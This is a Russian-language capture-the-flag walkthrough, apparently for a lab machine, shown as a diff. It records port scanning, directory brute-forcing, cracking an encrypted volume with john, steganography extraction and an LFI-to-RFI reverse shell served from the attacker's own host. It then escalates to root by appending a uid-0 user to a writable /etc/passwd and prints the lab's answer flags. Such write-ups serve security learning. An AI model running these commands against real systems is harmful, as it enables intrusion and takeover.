@@ -1,0 +1,69 @@
+1)nmap -A  -sS -T4 192.168.226.157 -p-
+    22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+    65534/tcp open  ftp     vsftpd 3.0.3
+    
+    меня сразу заинтересовал ftp сервер, я начала искать exploit, но нашла только с нарушением работы из-за ddos атаки
+
+2)gobuster -e -u dir http://192.168.226.157 -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc
+    connect.php
+    img
+
+    после того как зашла на connect.php, она вообще никак не отразилась, и я решила оставить пока этот файл в покое
+
+3)cewl -m 5 http://192.168.226.157 > dic.txt
+    собрала список слов с страницы и уже по нему начала искать диреториии
+
+    gobuster -e -u dir http://192.168.226.157 -w dic.txt -x zip,php,txt,html,bac,mp4,docx,doc
+ 
+ нашла преитересный файл bhaskara и страницу bhaskara.html
+ и если на .html ничего интересного не было, то с файлом предстояло разобраться
+
+ я не смогла его запустить, поэтому подумала что он зашифрован, тут на помощь приходит john
+
+ 4)python truecrypt2john.py bhaskara> hash
+  john --wordlist=/root/Downloads/rockyou.txt hash
+        xavier
+
+    с помощью спец программы veracrupt открываем этот файл, вводим пароль и получаем флаг
+        Bhaskara Flag: {b7bb88578a70970b9be45ac8630b6f9d}
+
+5)
+посмотрим что в папке img, странной кажется картинка с названием, в то время как все остальные пронумерованны
+долго рассматривала ее, решила скачать
+    wget http://192.168.226.157/img/aryabhata.jpg 
+
+    и просто от нечего делать решила поскать в ней скрытый файл
+        steghide extract -sf aryabhata.jpg 
+     
+    и нашла!!!!! flag.txt
+        Aryabhata Flag:{e39cf1cbb00f09141259768b6d4c63fb}
+
+6)
+возвращаясь к странной странице connect.php, это оказалось лоступом к уязвимости lfi
+    http://192.168.226.157/connect.php?file=/etc/passwd
+
+сначала я пыталась посмотреть /home/isro/.ssh/id_rsa
+Но у меня не получилось, я думала думала, а потом поняла, там где lfi наверняка должна быть rfi
+    <on-my-own_machine> python -m SimpleHTTPServer
+     <on-my-own_machine> rlwrap nc -nlvp 1234
+    <in-browser> http://192.168.226.157/connect.php?file=http://192.168.226.135:8000/shell.php
+
+7)после загрузки linpeas.sh , я узнала что /etc/passwd редактируем, вот это удача!!!!
+
+генерирую hash пароля root
+    openssl passwd -1 root
+
+дополняем /etc/passwd, если не дополнить, а полность переписать возникают проблемы - пишется что не могут иденнтифицировать пользователя
+    echo 'marina:$1$qtOiiueV$pDzGoo8OQNLMMIUQU/58q1:0:0::/root:/bin/bash'>>/etc/passwd
+
+8) cat /root/flag.txt
+    Chandrayaan Flag:{0ad8d59efe7ce5c820aa7350a5d708b2}
+
+9) не хватает одного флага, вспоминаю что видела файл с историей mysql у пользователя isro
+читаю ее, ничего интересного
+решила сама зайти в mysql, мало надеясь на удачу
+    mysql -uroot
+
+    аллилуйа получилось, после быстро нахожу флаг
+        Mangalyaan Flag:{d8a7f803e36f1c84e277009bf2c0f435}
